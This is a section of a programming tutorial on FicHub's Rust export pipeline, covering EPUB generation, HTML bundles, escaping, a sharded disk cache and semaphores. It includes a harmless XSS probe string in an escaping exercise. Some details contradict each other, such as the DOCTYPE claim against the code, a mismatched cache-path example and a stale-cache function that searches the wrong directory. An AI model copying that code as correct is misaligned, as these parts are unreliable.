# Part 5: The Export Pipeline

> *The scraping system is the bridge between the messy, ever-changing world of fanfiction websites and the clean, structured world of FicHub's database. In this part, we'll learn how FicHub takes the scraped HTML and converts it into beautiful, downloadable formats.*

---

## Chapter 28: Generating EPUBs

### What Is an EPUB?

Imagine you have a long fanfiction story — maybe 200,000 words spread across 45 chapters. You want to read it on your Kindle, your phone, or your tablet. But those sites aren't designed for comfortable offline reading. The text is wrapped in ads, navigation buttons, and formatting that looks terrible on an e-reader.

That's where EPUB comes in.

EPUB stands for **Electronic Publication**. It's the most common open format for ebooks. If you've ever downloaded a book from Project Gutenberg, or bought one from Google Play Books, you've probably used an EPUB file without even knowing it.

Under the hood, an EPUB is actually just a **ZIP file** with a specific structure. Inside that ZIP, you'll find:

- An `META-INF/container.xml` file that tells e-readers where to find the book structure
- An `OEBPS/content.opf` file that describes the book's metadata (title, author, language)
- XHTML files for each chapter
- A CSS stylesheet for formatting
- Optionally, images and other resources

Think of it like a really well-organized folder that got zipped up into one file.

💡 **Key Concept:** An EPUB is not a single format in the way a PNG image is. It's a *package* — a bundle of files arranged in a standard structure that e-readers know how to interpret. The structure is defined by the IDPF (International Digital Publishing Forum), now maintained by the W3C.

### Why Fanfiction Sites Need EPUB Support

Fanfiction sites like Archive of Our Own (AO3) and FanFiction.net have their own reading interfaces, but they're designed for browsing, not deep reading. You're staring at a browser tab, scrolling through chapter after chapter, accidentally closing the wrong tab, losing your place when you switch devices.

EPUB solves this by giving you a *file* you own. You can:

- Read offline on an airplane
- Highlight passages and add notes
- Sync across devices with services like Calibre or Google Play Books
- Send it to your Kindle with one click
- Archive your favorites for when a fic gets deleted

FicHub makes this possible for any fanfiction, on any supported site, with one API call.

### How FicHub Fits Into the Picture

FicHub isn't trying to replace AO3 or FanFiction.net. It's a bridge between those sites and your reading device. The flow is simple:

1. User pastes a URL into FicHub's web interface
2. FicHub scrapes the story's metadata and chapters
3. FicHub generates an EPUB (and an HTML bundle)
4. The user downloads the file

The generation happens server-side, which means:
- No JavaScript runs in the user's browser (faster, works on old devices)
- The heavy lifting (parsing HTML, building ZIP archives) happens on FicHub's server
- The user gets a clean download link, not a complex processing flow

This architecture also means FicHub can support many export formats without cluttering the user interface. EPUB, HTML, and eventually MOBI and PDF — all from the same scraped data.

### The epub-builder Crate

FicHub doesn't generate EPUBs by hand-writing all that XML and ZIP structure. Instead, it uses the `epub-builder` crate, which gives us a clean Rust API for building EPUB files.

Here's the dependency in `Cargo.toml`:

```toml
[dependencies]
epub-builder = "0.7"
md5 = "0.7"
uuid = { version = "1", features = ["v4"] }
```

The `epub-builder` crate gives us two main things:

1. **`EpubBuilder`** — A builder pattern struct that accumulates metadata, stylesheets, and content
2. **`ZipLibrary`** — The backend that handles writing the actual ZIP archive

Let's see how it works in FicHub's `src/export/epub.rs`:

```rust
use epub_builder::{EpubBuilder, EpubContent, ZipLibrary};
use uuid::Uuid;

pub async fn create_epub(
    meta: &FicMetadata,
    chapters: &[Chapter],
    tmp_dir: &Path,
) -> Result<(PathBuf, String), ExportError> {
    // Create a unique work directory
    let uuid = Uuid::new_v4();
    let work_dir = tmp_dir.join(uuid.to_string());
    fs::create_dir_all(&work_dir)?;

    // Build the EPUB
    let mut builder = EpubBuilder::new(ZipLibrary::new()?)?;

    // Add metadata
    builder.metadata("title", &meta.title)?;
    builder.metadata("author", &meta.author)?;
    builder.metadata("lang", "en")?;
    builder.metadata("description", &meta.desc)?;

    // Add CSS
    let css = concat!(
        "body{font-family:serif;line-height:1.5;}",
        "h2{text-align:center;}",
        "p{margin:0.5em 0;}"
    );
    builder.stylesheet(css.as_bytes())?;

    // Add chapters...
    // Write to file...
    // Compute MD5 hash...

    Ok((epub_path, md5_hex))
}
```

Notice the pattern: **create a temporary directory, build the EPUB, return the path and hash**. This is a common pattern in export systems — you generate into a temporary location first, then move to the final cache location. This two-phase approach means the file never appears in the cache directory in a half-written state.

### Building an EPUB Step by Step

Let's walk through the full process in detail:

**Step 1: Create a unique work directory**

```rust
let uuid = Uuid::new_v4();
let work_dir = tmp_dir.join(uuid.to_string());
fs::create_dir_all(&work_dir)?;
```

Why UUID? Because FicHub might be generating EPUBs for multiple requests at the same time. Each request needs its own isolated workspace so they don't step on each other's toes. UUIDs guarantee uniqueness — the odds of two UUIDs being the same are about one in 5.3 undecillion (that's 10^36).

The work directory is inside `tmp_dir`, which is a temporary directory (typically `/tmp` or a dedicated volume). After the EPUB is moved to the cache, the work directory can be cleaned up.

**Step 2: Initialize the builder**

```rust
let mut builder = EpubBuilder::new(ZipLibrary::new()?)?;
```

The `ZipLibrary::new()` call creates the ZIP writing backend. If this fails (which would be unusual — it only fails if the zip library can't allocate memory), we return an `ExportError`.

**Step 3: Add metadata**

```rust
builder.metadata("title", &meta.title)?;
builder.metadata("author", &meta.author)?;
builder.metadata("lang", "en")?;
builder.metadata("description", &meta.desc)?;
```

This tells e-readers about the book. When you open the EPUB in a Kindle app, this is where "Harry Potter and the Methods of Rationality" and "Less Wrong" come from. The `lang` field tells the reader to use English hyphenation rules and spell-checking.

**Step 4: Add a stylesheet**

```rust
let css = concat!(
    "body{font-family:serif;line-height:1.5;}",
    "h2{text-align:center;}",
    "p{margin:0.5em 0;}"
);
builder.stylesheet(css.as_bytes())?;
```

The `concat!` macro stitches multiple string literals together at compile time. No runtime cost at all — the compiler joins them into one string before the program even runs. The `.as_bytes()` converts the `&str` to `&[u8]` because `stylesheet()` expects raw bytes.

**Step 5: Add the introduction page**

We'll dive into this in Chapter 29, but essentially we create an XHTML page that shows the fic's metadata table — title, author, word count, chapter count, publication status, and the summary description.

**Step 6: Add chapters**

Each chapter becomes its own XHTML page in the EPUB. The scraper produces HTML for each chapter, and FicHub wraps it in a proper XHTML envelope.

**Step 7: Write and hash**

After building, we write the EPUB file to disk and compute its MD5 hash for cache-key purposes.

### Why EPUB First?

You might notice that FicHub generates the EPUB first, then creates the HTML bundle. There's a good reason for this ordering — the EPUB is the "primary" export format. Other formats (HTML, and potentially MOBI/PDF via Calibre) are derived from it. This means if the EPUB generation fails, we can short-circuit early instead of doing wasted work.

The EPUB is also the more complex format. It has strict XHTML requirements, metadata specifications, and ZIP structure rules. If we can successfully build an EPUB, we know the underlying data is good enough for simpler formats like the HTML bundle.

### The Return Value

The `create_epub` function returns `Result<(PathBuf, String), ExportError>`:

- **`PathBuf`** — The file path where the EPUB was written
- **`String`** — The MD5 hex hash of the EPUB contents

This tuple is the handoff point between the export module and the cache system. The caller takes the path and moves the file to the cache directory, then uses the hash as part of the cache key.

🧪 **Try It Yourself:** Write a small Rust program that creates a minimal EPUB with one chapter. Use `epub-builder` to add a title, author, and one XHTML page. Save it and try opening it in an e-reader app on your phone. Bonus: unzip the EPUB and inspect the files inside — you'll see the XML structure.

⚠️ **Watch Out:** The `epub-builder` crate's `metadata()` method returns `Result`, but the error types don't always tell you *what* went wrong. Common mistakes include setting empty strings for required metadata fields or using characters that break XML (like `<` or `&` without escaping). Always use FicHub's `escape_html()` helper for any user-provided strings.

---

## Chapter 29: EPUB Metadata

### Title, Author, Description

When you open an EPUB file in a reading app, the first thing you see isn't the story — it's a title page with the book's information. FicHub generates this from the `FicMetadata` struct that came from the scraper.

The metadata page serves several purposes:

1. **Identification** — The reader knows what they're looking at
2. **Library management** — E-reader apps use this data for sorting, searching, and displaying in your library
3. **Credits** — The author gets proper attribution
4. **Context** — Word count and chapter count set expectations for reading time

### Building the Introduction Page

Let's look at how FicHub builds the introduction page:

```rust
let intro_html = format!(
    r#"<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>Introduction</title>
    <link rel="stylesheet" type="text/css" href="stylesheet.css"/>
</head>
<body>
    <h1>{title}</h1>
    <h2>by {author}</h2>
    <table>
        <tr><td>Words:</td><td>{words}</td></tr>
        <tr><td>Chapters:</td><td>{chapters}</td></tr>
        <tr><td>Status:</td><td>{status}</td></tr>
        <tr><td>Published:</td><td>{published}</td></tr>
        <tr><td>Updated:</td><td>{updated}</td></tr>
    </table>
    <hr/>
    <p>{desc}</p>
</body>
</html>"#,
    title = escape_html(&meta.title),
    author = escape_html(&meta.author),
    words = meta.words,
    chapters = meta.chapters,
    status = escape_html(&meta.status),
    published = format_timestamp(meta.published),
    updated = format_timestamp(meta.updated),
    desc = escape_html(&meta.desc),
);
```

Notice how every string value goes through `escape_html()` — but numbers like `words` and `chapters` don't need it because they're integers. This is a safety pattern we'll come back to again and again: **escape user-provided or scraped strings, trust computed values.**

The introduction page uses an `<h1>` for the title (the most prominent heading) and `<h2>` for the author. This hierarchy tells e-readers and screen readers that the title is the primary element, with the author as secondary.

The metadata table uses a simple `<table>` with `<tr>` (table row) and `<td>` (table data) elements. No fancy styling — we let the e-reader decide how to render tables.

### Adding the Introduction to the Builder

```rust
builder.add_content(
    EpubContent::new("introduction.xhtml", intro_html.as_bytes())
        .title("Introduction"),
)?;
```

The `EpubContent::new()` takes two arguments: the filename within the EPUB archive, and the actual bytes of the content. The `.title()` method sets the display name for the table of contents. When you tap "Table of Contents" in your e-reader, you'll see "Introduction" as the first entry.

The filename `introduction.xhtml` is arbitrary — it could be anything. But FicHub uses descriptive filenames to make debugging easier. If you unzip an EPUB and see `introduction.xhtml`, you immediately know what it contains.

### CSS Styling for Chapters

FicHub's EPUB stylesheet is deliberately minimal:

```rust
let css = concat!(
    "body{font-family:serif;line-height:1.5;}",
    "h2{text-align:center;}",
    "p{margin:0.5em 0;}"
);
```

Let's break this down:

- **`font-family:serif`** — Uses the e-reader's default serif font (usually something like Georgia or Times). Serif fonts are traditional for books and easier on the eyes for long reading sessions. The small strokes at the ends of letters (the "serifs") guide the eye along the line of text.

- **`line-height:1.5`** — 1.5x the font size. This is the "Goldilocks" of line spacing — not too tight, not too loose. Typographers recommend 1.4-1.6 for body text.

- **`h2{text-align:center}`** — Chapter titles are centered, giving each chapter a clear visual break. This is a common convention in published books.

- **`p{margin:0.5em 0}`** — Half an em of vertical spacing between paragraphs. The `em` unit is relative to the font size, so it scales proportionally when the reader changes font size.

Why so minimal? Because e-readers handle a lot of the typography themselves. Adding too much CSS can actually fight with the reader's settings (like the user's preferred font size or dark mode). FicHub's philosophy is: provide just enough structure, and let the e-reader handle the rest.

Some developers go overboard with EPUB CSS — custom fonts, colors, margins for every element. But e-readers like Kindle, Kobo, and Apple Books have their own typography engines. Your CSS competes with their defaults, and the reader usually wins. Keeping it simple is not laziness — it's good design.

### XHTML Wrapping

Every chapter in an EPUB must be valid XHTML. This is stricter than regular HTML:

```rust
let chapter_html = format!(
    r#"<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>{title}</title>
    <link rel="stylesheet" type="text/css" href="stylesheet.css"/>
</head>
<body>
    <h2>{title}</h2>
    {content}
</body>
</html>"#,
    title = escape_html(&chapter.title),
    content = chapter.content,
);
```

Key differences from regular HTML:

1. **XML declaration** — `<?xml version="1.0" encoding="utf-8"?>` tells the parser this is XML
2. **DOCTYPE** — Must be the XHTML DOCTYPE, not HTML5's simpler `<!DOCTYPE html>`
3. **XML namespace** — `xmlns="http://www.w3.org/1999/xhtml"` identifies the document as XHTML
4. **All tags must be closed** — `<br/>` not `<br>`, `<img ... />` not `<img ...>`
5. **All attributes quoted** — `class="foo"` not `class=foo`
6. **Lowercase tag names** — `<div>` not `<DIV>`
7. **Proper nesting** — `<b><i>text</i></b>` not `<b><i>text</b></i>`

The `chapter.content` comes from the scraper, which already produces HTML that's compatible with XHTML. If it didn't, e-readers would refuse to display the chapter. The scraper is responsible for producing well-formed XHTML.

### Adding Chapters to the Builder

Each chapter gets its own file in the EPUB:

```rust
for chapter in chapters {
    let chapter_html = format!(
        r#"<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>{title}</title>
    <link rel="stylesheet" type="text/css" href="stylesheet.css"/>
</head>
<body>
    <h2>{title}</h2>
    {content}
</body>
</html>"#,
        title = escape_html(&chapter.title),
        content = chapter.content,
    );

    let filename = format!("chapter_{}.xhtml", chapter.chapter_id);
    builder.add_content(
        EpubContent::new(filename.as_str(), chapter_html.as_bytes())
            .title(&chapter.title),
    )?;
}
```

The filename `chapter_5.xhtml` tells the EPUB reader to display this as the 5th chapter. The `.title(&chapter.title)` sets what appears in the table of contents. Readers see chapter titles like "Chapter 5: The Rescue" rather than raw filenames.

💡 **Key Concept:** Each `add_content()` call adds a page to the EPUB's spine — the ordered list of pages that e-readers navigate through. The order of calls matters: introduction first, then chapters in order. If you add chapters out of order, the e-reader will display them out of order too.

### The escape_html Function

This small helper function is incredibly important:

```rust
fn escape_html(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#39;")
}
```

It converts special HTML characters into their entity equivalents:

| Character | Replacement | Why |
|-----------|-------------|-----|
| `&` | `&amp;` | Ampersand starts entities |
| `<` | `&lt;` | Less-than starts tags |
| `>` | `&gt;` | Greater-than ends tags |
| `"` | `&quot;` | Quotes delimit attributes |
| `'` | `&#39;` | Apostrophes can break attributes |

Without this, a fic titled "Tom & Jerry's Adventure" would produce invalid HTML (`Tom & Jerry's`) and an author named `<script>` would create a security vulnerability.

The ORDER of replacements matters critically. We replace `&` FIRST, because all the other replacements produce strings containing `&`. If we replaced `<` first, the `&` in `&lt;` would then be replaced again by the `&` → `&amp;` rule, producing `&amp;lt;` instead of the correct `&lt;`.

### format_timestamp Helper

The scraper stores dates as Unix timestamps in milliseconds. FicHub converts them to human-readable dates:

```rust
fn format_timestamp(unix_millis: i64) -> String {
    use chrono::DateTime;

    let secs = unix_millis / 1000;
    let nsecs = ((unix_millis % 1000) * 1_000_000) as u32;

    DateTime::from_timestamp(secs, nsecs)
        .map(|dt| dt.format("%Y-%m-%d").to_string())
        .unwrap_or_default()
}
```

The math here: divide milliseconds by 1000 to get seconds, then compute the nanosecond remainder for `DateTime::from_timestamp()`. The `chrono` crate handles all the calendar math, and we format as `YYYY-MM-DD`.

Why milliseconds? Because JavaScript (which runs on many fanfiction sites) uses millisecond timestamps natively (`Date.now()` returns milliseconds). The scrapers preserve this precision even though we only display days.

The `unwrap_or_default()` is a safety net. If the timestamp is invalid (zero, negative, or far in the future), we return an empty string rather than crashing.

🧪 **Try It Yourself:** Create a `FicMetadata` struct with a title containing `<script>alert('xss')</script>` and a description with `<p>` tags. Run `escape_html()` on both and verify the output is safe. Then try feeding the escaped output to an HTML validator.

⚠️ **Watch Out:** The `escape_html()` function is called on the *title* and *description* from metadata, but the *chapter content* (`chapter.content`) is NOT escaped. This is intentional — the chapter content is already HTML from the scraper. But if you ever need to insert user-provided content into the chapter body, you must escape it first. This is a common source of XSS vulnerabilities in web applications.

---

## Chapter 30: HTML Bundles

### What Is an HTML Bundle?

Not everyone has a Kindle. Some people just want to read a story in their web browser, save it for offline reading, or send it to a friend as a single file. That's what HTML bundles are for.

An HTML bundle in FicHub is a **ZIP file containing a single self-contained HTML file**. That HTML file has:

- All the fic's metadata (title, author, word count, etc.)
- A chapter navigation table of contents
- Every chapter's content in one scrollable page
- Embedded CSS for styling

The key word here is **self-contained**. Unlike a regular web page, there are no external CSS files, no JavaScript, no CDN links. Everything needed to display the story is inside that one HTML file. You could email it to someone and it would work perfectly.

The HTML bundle format is particularly useful for:

- **Browser reading** — Just open the HTML file and scroll
- **Sharing** — Send it to a friend who doesn't have an e-reader
- **Printing** — Open in a browser and print to paper
- **Accessibility** — Screen readers handle HTML better than EPUB in some cases
- **Archiving** — HTML is the most universal format; it'll be readable in 100 years

### EPUB vs HTML Bundle: When to Use Which

Both formats contain the same story content, but they serve different needs:

| Feature | EPUB | HTML Bundle |
|---------|------|-------------|
| Reading app required? | Yes (Kindle, Apple Books, etc.) | No (any browser works) |
| Offline reading? | Yes (dedicated reader) | Yes (save the file) |
| Table of contents? | Built into reader UI | In-page navigation |
| Font customization? | Per-reader settings | CSS only |
| Notes/highlights? | Supported by readers | Not supported |
| Sharing ease? | Need compatible app | Anyone can open it |
| File size (compressed) | Smaller (better structure) | Larger (all CSS inline) |

The EPUB format is better for serious, long-term reading. The HTML bundle is better for quick access and sharing. FicHub generates both simultaneously so users can choose.

### The zip Crate

FicHub uses the `zip` crate to create the ZIP archive:

```toml
[dependencies]
zip = "0.6"
```

The `zip` crate gives us a `ZipWriter` that works like a regular writer, but produces a ZIP file:

```rust
use zip::write::SimpleFileOptions;
use zip::CompressionMethod;
use zip::ZipWriter;

let zip_path = work_dir.join("bundle.zip");
let zip_file = fs::File::create(&zip_path)?;
let mut zip = ZipWriter::new(zip_file);

let options = SimpleFileOptions::default()
    .compression_method(CompressionMethod::Deflated)
    .unix_permissions(0o644);

zip.start_file("index.html", options)?;
zip.write_all(html.as_bytes())?;
zip.finish()?;
```

Three steps:

1. **Create the ZIP writer** — wraps a regular file handle
2. **Start a file** — declares the filename and compression options
3. **Write and finish** — write the bytes and close the ZIP

The `Deflated` compression method is the standard ZIP compression (same as `gzip`). It's fast and effective for text content. HTML files with embedded CSS typically compress to 20-30% of their original size.

The `unix_permissions(0o644)` ensures the file is readable by everyone when unzipped on Unix systems. The `0o644` means: owner can read/write, group and others can read.

⚠️ **Watch Out:** The `zip` crate's `start_file()` returns a `Result`. If you call `write_all()` before calling `start_file()` (or if `start_file()` fails), you'll get a `ZipError`. Always chain these operations with `?` and handle errors properly. A common mistake is forgetting to call `zip.finish()` — without it, the ZIP file is incomplete and corrupt.

### Building the Full HTML Page

The HTML bundle generation in `src/export/html_bundle.rs` builds one large HTML string. Let's look at the structure:

```rust
pub async fn create_html_bundle(
    meta: &FicMetadata,
    chapters: &[Chapter],
    tmp_dir: &Path,
) -> Result<(PathBuf, String), ExportError> {
    let uuid = Uuid::new_v4();
    let work_dir = tmp_dir.join(uuid.to_string());
    fs::create_dir_all(&work_dir)?;

    let mut chapters_nav = String::new();
    let mut chapters_content = String::new();

    for chapter in chapters {
        // Build navigation link
        chapters_nav.push_str(&format!(
            r##"<li><a href="#ch{ch}">{title}</a></li>"##,
            ch = chapter.chapter_id,
            title = escape_html(&chapter.title),
        ));

        // Build chapter content
        chapters_content.push_str(&format!(
            r#"<h2 id="ch{ch}">{title}</h2>
{content}"#,
            ch = chapter.chapter_id,
            title = escape_html(&chapter.title),
            content = chapter.content,
        ));
    }
    // ... assemble and write
}
```

We build two strings simultaneously:

1. **`chapters_nav`** — A list of `<li>` elements with anchor links
2. **`chapters_content`** — The actual chapter headings and content

The `push_str()` method appends to a `String` efficiently. For large fics with many chapters, this is much better than repeated `format!()` concatenations, which would allocate a new string each time.

### Self-Contained CSS

The HTML bundle includes all CSS inline in a `<style>` tag. This is the key to being self-contained — no external files to reference:

```css
body {
    font-family: Georgia, 'Times New Roman', serif;
    line-height: 1.7;
    color: #333;
    max-width: 800px;
    margin: 0 auto;
    padding: 20px;
    background: #fafafa;
}
```

This CSS creates a comfortable reading experience:
- **Georgia font** — A clean serif font available on virtually all devices
- **1.7 line height** — Even more generous than the EPUB's 1.5, because browser reading is typically on a larger screen
- **800px max width** — Prevents lines from getting too long to read comfortably
- **Centered layout** — The `margin: 0 auto` centers the content on wide screens
- **Light background** — The `#fafafa` is a very light gray that's easier on the eyes than pure white

💡 **Key Concept:** Double braces `{{` and `}}` inside Rust's `format!()` are how you escape literal braces. Since `format!()` uses `{}` for interpolation, you need `{{` for a literal `{` in the output. This is why the CSS in the format string has `{{` instead of `{`.

Notice the viewport meta tag:

```html
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
```

This tells mobile browsers to render the page at the device's actual width, not zoomed out to 980px (the default). Without this, the fic would look tiny on a phone screen.

### Writing the HTML File

After assembling the HTML string, FicHub writes it and bundles it:

```rust
let html_path = work_dir.join("index.html");
fs::write(&html_path, &html)?;

let zip_path = work_dir.join("bundle.zip");
let zip_file = fs::File::create(&zip_path)?;
let mut zip = ZipWriter::new(zip_file);

let options = SimpleFileOptions::default()
    .compression_method(CompressionMethod::Deflated)
    .unix_permissions(0o644);

zip.start_file("index.html", options)?;
zip.write_all(html.as_bytes())?;
zip.finish()?;
```

Why ZIP a single HTML file? Three reasons:

1. **Consistency** — All export types produce ZIP archives (EPUB is a ZIP too). This means the download route code is simpler — it doesn't need to know what format the file is.
2. **File size** — HTML with embedded CSS compresses well, often 70-80% smaller. A 500KB HTML file might compress to 150KB.
3. **CDN compatibility** — The `.zip` extension works better with some CDN configurations that treat `.html` files differently (adding security headers, caching differently, etc.)

### MD5 Hashing

After creating the ZIP, FicHub computes an MD5 hash of the entire file:

```rust
let zip_data = fs::read(&zip_path)?;
let md5_hex = Md5::digest(&zip_data)
    .iter()
    .map(|b| format!("{:02x}", b))
    .collect::<String>();
```

This hash becomes part of the cache key. If the same fic content is re-exported with identical results, the hash will be the same, and FicHub can skip re-caching. If anything changes (even one byte in the HTML), the hash changes completely.

The `{:02x}` format ensures each byte is represented as exactly two lowercase hex digits. The `.collect::<String>()` gathers all the formatted bytes into a single 32-character string.

🧪 **Try It Yourself:** Create a simple HTML file with some CSS and text, then use the `zip` crate to bundle it. Try different compression methods (Deflated, Stored, Bzip2) and compare file sizes. For a 100KB HTML file, what's the difference?

---

## Chapter 31: The Disk Cache

### Why Cache?

Imagine 10,000 people want to download the same popular Harry Potter fanfiction on the same day. Without caching, FicHub would:

1. **Scrape the site 10,000 times** — This would hammer the source website's servers and likely get FicHub's IP banned
2. **Generate the EPUB 10,000 times** — Each generation takes CPU time for XML construction, ZIP compression, and MD5 hashing
3. **Generate the HTML bundle 10,000 times** — Even more wasted work
4. **Use disk I/O for nothing** — Each generation writes and reads temporary files

With caching, FicHub does the hard work *once* and serves the cached file to everyone else. The 10,000 requests become:

1. 1 actual scrape + export (the "cold" request)
2. 9,999 cache hits (each takes under 100 milliseconds)

This is the single most important performance optimization in the system.

### Cache Architecture Overview

FicHub's cache works at three levels:

1. **Database-level** — The `export_log` table tracks which versions have been generated. This is the "lookup" layer. It answers the question: "Has this fic been exported at this version before?"
2. **Disk-level** — The actual EPUB/HTML files are stored on the filesystem. This is the "storage" layer. It holds the binary data that gets sent to the user.
3. **Memory-level** — Semaphores prevent duplicate concurrent generation. This is the "coordination" layer. It answers the question: "Is someone currently generating this fic's export?"

The database says *whether* something is cached. The disk says *where* the file lives. The semaphore says *who* is currently generating. Together, they form a complete caching system.

This three-layer approach is common in production systems. Each layer handles a different concern, and each can fail independently without bringing down the whole system. If the database is temporarily unreachable, FicHub can still serve already-cached files. If a disk sector goes bad, the database can trigger regeneration. If the semaphore system crashes, duplicate work happens but no data is corrupted.

### Cache Path Structure

The disk cache uses a hierarchical directory structure to avoid having thousands of files in a single directory. Let's look at `src/cache/disk.rs`:

```rust
pub fn cache_path(cache_root: &Path, etype: &EType, url_id: &str, hash: &str) -> PathBuf {
    let mut path = cache_root.join(etype.as_str());

    // Split url_id into 3-char directory chunks (up to 9 chars = 3 levels deep)
    let chars: Vec<char> = url_id.chars().collect();
    for i in (0..chars.len()).step_by(3).take(3) {
        let chunk: String = chars.iter().skip(i).take(3).collect();
        if !chunk.is_empty() {
            path = path.join(chunk);
        }
    }

    // Full url_id directory
    path = path.join(url_id);

    // Actual file: hash + suffix
    path.join(format!("{}{}", hash, etype.suffix()))
}
```

For a URL with `url_id = "abcdef"` and an EPUB with hash `"a1b2c3d4"`, this produces:

```
/cache/epub/abc/def/abcdef/a1b2c3d4.epub
```

For a longer `url_id = "abcdefghijklm"`:

```
/cache/mobi/abc/def/ghi/abcdefghijklm/a1b2c3d4.mobi
```

And for a short `url_id = "xyz"`:

```
/cache/html/xyz/xyz/xyz789.zip
```

The 3-character directory splits serve an important purpose: they prevent the operating system from having too many entries in a single directory. Most Linux filesystems (ext4, btrfs, xfs) use a hash table for directory entries, but performance degrades significantly when a directory has more than a few thousand entries. Operations like `ls`, `find`, and `stat` slow down as the linear scan gets longer. By splitting into subdirectories, FicHub ensures fast lookups even with millions of cached files.

The directory hierarchy also makes manual inspection easier. If you're debugging a cache issue, you can `ls /cache/epub/abc/def/abcdef/` and see exactly what's cached for that fic. Without the splits, you'd be looking at a flat directory with millions of files.

The algorithm takes up to three chunks of 3 characters each (9 characters total). After those prefix directories, it stores the full `url_id` as a final directory. This two-level nesting (prefix + full id) provides both fast traversal and a stable location for each fic.

### The EType Enum

The `EType` enum defines the export types:

```rust
#[derive(Debug, Clone, Hash, Eq, PartialEq)]
pub enum EType {
    Epub,
    Html,
    Mobi,
    Pdf,
}
```

The `#[derive(...)]` line deserves explanation:

- **`Debug`** — Lets us print `EType::Epub` with `{:?}` for debugging
- **`Clone`** — Lets us copy the enum (it's just a single variant, so this is trivial)
- **`Hash`** — Lets us use `EType` as a key in `HashMap` (needed for the semaphore map)
- **`Eq` and `PartialEq`** — Lets us compare `EType` values with `==`

The `as_str()` method converts to a string for database queries:

```rust
pub fn as_str(&self) -> &'static str {
    match self {
        EType::Epub => "epub",
        EType::Html => "html",
        EType::Mobi => "mobi",
        EType::Pdf => "pdf",
    }
}
```

Notice the return type `&'static str` — this is a string literal that lives for the entire program lifetime. No allocation needed, no cleanup.

The `suffix()` method returns the file extension:

```rust
pub fn suffix(&self) -> &'static str {
    match self {
        EType::Epub => ".epub",
        EType::Html => ".zip",
        EType::Mobi => ".mobi",
        EType::Pdf => ".pdf",
    }
}
```

Notice something interesting about `EType::Html` — its suffix is `.zip`, not `.html`. That's because the HTML bundle is a ZIP file containing HTML. The suffix reflects the actual file type on disk, not the content type.

The `version()` method returns the format-specific version number:

```rust
pub fn version(&self) -> i32 {
    match self {
        EType::Epub => 1,
        EType::Html => 1,
        EType::Mobi => 0,
        EType::Pdf => 0,
    }
}
```

Versions 0 for MOBI and PDF mean those formats are planned but not yet fully implemented. When the EPUB template changes, bumping `EType::Epub`'s version from 1 to 2 invalidates all cached EPUBs without affecting HTML bundles.

The `FromStr` implementation lets us parse strings into `EType`:

```rust
impl std::str::FromStr for EType {
    type Err = ();

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "epub" => Ok(EType::Epub),
            "html" => Ok(EType::Html),
            "mobi" => Ok(EType::Mobi),
            "pdf" => Ok(EType::Pdf),
            _ => Err(()),
        }
    }
}
```

The `.to_lowercase()` call means both `"EPUB"` and `"epub"` work — good UX for API consumers. The error type `()` means we don't provide detailed error information; for a simple enum parse, an empty error type is fine.

### Cache Semaphores

Here's a subtle but critical problem: what if two people request the same fic at the exact same moment?

Without protection:

1. Request A checks cache → miss
2. Request B checks cache → miss
3. Request A starts generating EPUB
4. Request B starts generating EPUB
5. Both finish → both write to cache → one overwrites the other

The second EPUB generation is wasted work, and there's a tiny window where the cache file might be corrupted (half-written by one request while the other is reading).

The solution is **semaphores** — a concurrency primitive that ensures only one task can access a shared resource at a time:

```rust
pub type CacheSemaphores = Arc<Mutex<HashMap<(String, EType), Arc<Semaphore>>>>;

pub async fn get_export_semaphore(
    semaphores: &CacheSemaphores,
    url_id: &str,
    etype: &EType,
) -> Arc<Semaphore> {
    let key = (url_id.to_string(), etype.clone());
    let mut map = semaphores.lock().await;
    map.entry(key)
        .or_insert_with(|| Arc::new(Semaphore::new(1)))
        .clone()
}
```

Let's break this down:

1. **`CacheSemaphores`** is an `Arc<Mutex<HashMap<...>>>` — a thread-safe, reference-counted, locked dictionary
2. The key is `(url_id, etype)` — we need separate semaphores for EPUB and HTML generation (generating one format shouldn't block the other)
3. `Semaphore::new(1)` creates a semaphore that allows exactly one task at a time
4. `or_insert_with` creates the semaphore only if one doesn't exist yet (lazy initialization)
5. We return `Arc<Semaphore>` so multiple tasks can share the same semaphore

The semaphore itself is just a ticket system: only one task can "acquire" the semaphore at a time. Others wait until it's released. This ensures that even if 100 requests come in simultaneously for the same fic, only one actually generates the EPUB.

💡 **Key Concept:** A `Semaphore` with capacity 1 is sometimes called a **mutex** (mutual exclusion). But using a semaphore specifically (rather than `Mutex`) lets us add more capacity later if needed — say, allowing 2 concurrent generations per fic.

### Cache File Operations

The disk module provides several utility functions that handle the mechanics of cache management.

**Moving files to cache:**

```rust
pub fn move_to_cache(source: &Path, dest: &Path) -> AppResult<()> {
    if let Some(parent) = dest.parent() {
        fs::create_dir_all(parent)?;
    }
    fs::rename(source, dest)?;
    Ok(())
}
```

This creates parent directories if needed and moves the file atomically. `fs::rename()` is atomic on the same filesystem — the file either moves completely or not at all. There's never a state where half the file is in temp and half is in cache.

**Checking cache existence:**

```rust
pub fn cache_file_exists(path: &Path) -> bool {
    path.exists()
}
```

Simple but important — this is the final check before serving a file. Even if the database says a file is cached, the actual file might have been deleted (by a cleanup script, a disk failure, or manual intervention).

**Clearing stale cache:**

```rust
pub fn clear_stale_cache(
    cache_root: &Path,
    etype: &EType,
    url_id: &str,
    keep_hash: &str,
) -> AppResult<()> {
    let dir = cache_root.join(etype.as_str()).join(url_id);
    if dir.exists() {
        if let Ok(entries) = fs::read_dir(&dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() {
                    if let Some(stem) = path.file_stem() {
                        if stem != keep_hash {
                            let _ = fs::remove_file(&path);
                        }
                    }
                }
            }
        }
    }
    Ok(())
}
```

When a fic's version changes (say, the author updated chapter 3), FicHub generates a new EPUB with a different hash. But the old cached EPUB is still sitting on disk. This function removes old hashes for a given fic, keeping only the current one.

The `let _ = fs::remove_file(&path)` deliberately ignores errors — if deletion fails (permission issue, file already gone), we don't want to crash. We're cleaning up best-effort.

**Computing file MD5:**

```rust
pub fn file_md5(path: &Path) -> AppResult<String> {
    use md5::{Md5, Digest};
    let data = fs::read(path)?;
